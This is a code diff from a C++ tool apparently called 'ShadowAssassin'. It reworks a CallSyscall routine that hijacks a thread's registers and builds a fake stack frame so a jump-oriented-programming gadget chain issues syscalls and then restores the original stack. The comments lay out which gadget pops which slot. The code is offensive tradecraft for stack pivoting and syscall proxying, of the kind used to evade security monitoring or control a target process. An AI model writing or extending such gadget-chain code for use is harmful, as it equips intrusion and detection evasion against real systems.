@@ -403,11 +403,24 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 
 	frameManager.WriteRegister("rax", jopManager.GetRax());
 	frameManager.WriteRegister("rsi", jopManager.GetRsi());
-	// Save original RSP so gadget4's pop rsp restores it, then redirect RSP to scratch
+	frameManager.WriteRegister("rip", jopManager.GetRip());
+
+	// Stack layout when chain fires (RSP = newRsp+0x10):
+	//   [newRsp+0x18] = originalRsp   ← gadget4 pop rsp restores real stack
+	//   [newRsp+0x10] = rdx_value     ← gadget2 pop rdx reads this (after target returns)
+	//   [newRsp+0x08] = return addr   ← gadget1 call pushes here (clobbers, don't care)
+	//   [newRsp .. ]  = real stack, function grows into this
 	UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
-	jopManager.SetOriginalRsp(originalRsp);
-	DbgLog("[CallSyscall] originalRsp=0x%llX -> restored by gadget4 pop rsp\n", originalRsp);
-	frameManager.WriteRegister("rsp", jopManager.GetRspSetupAddr());
+	UINT64 newRsp = originalRsp - 0x200;
+
+	writeFn(newRsp + 0x18, originalRsp);
+	writeFn(newRsp + 0x10, jopManager.GetRdx());
+	writeFn(newRsp + 0x08, 0);  // call will overwrite with return addr
+
+	frameManager.WriteRegister("rsp", newRsp + 0x10);
+	DbgLog("[CallSyscall] rsp=0x%llX rdx_slot=0x%llX orig_rsp_slot=0x%llX\n",
+		newRsp + 0x10, newRsp + 0x10, newRsp + 0x18);
+
 
     UINT64 current_rip = frameManager.ReadRegister("rip");
     printf("[CallSyscall] Current RIP (set breakpoint here) %llx \n", current_rip);
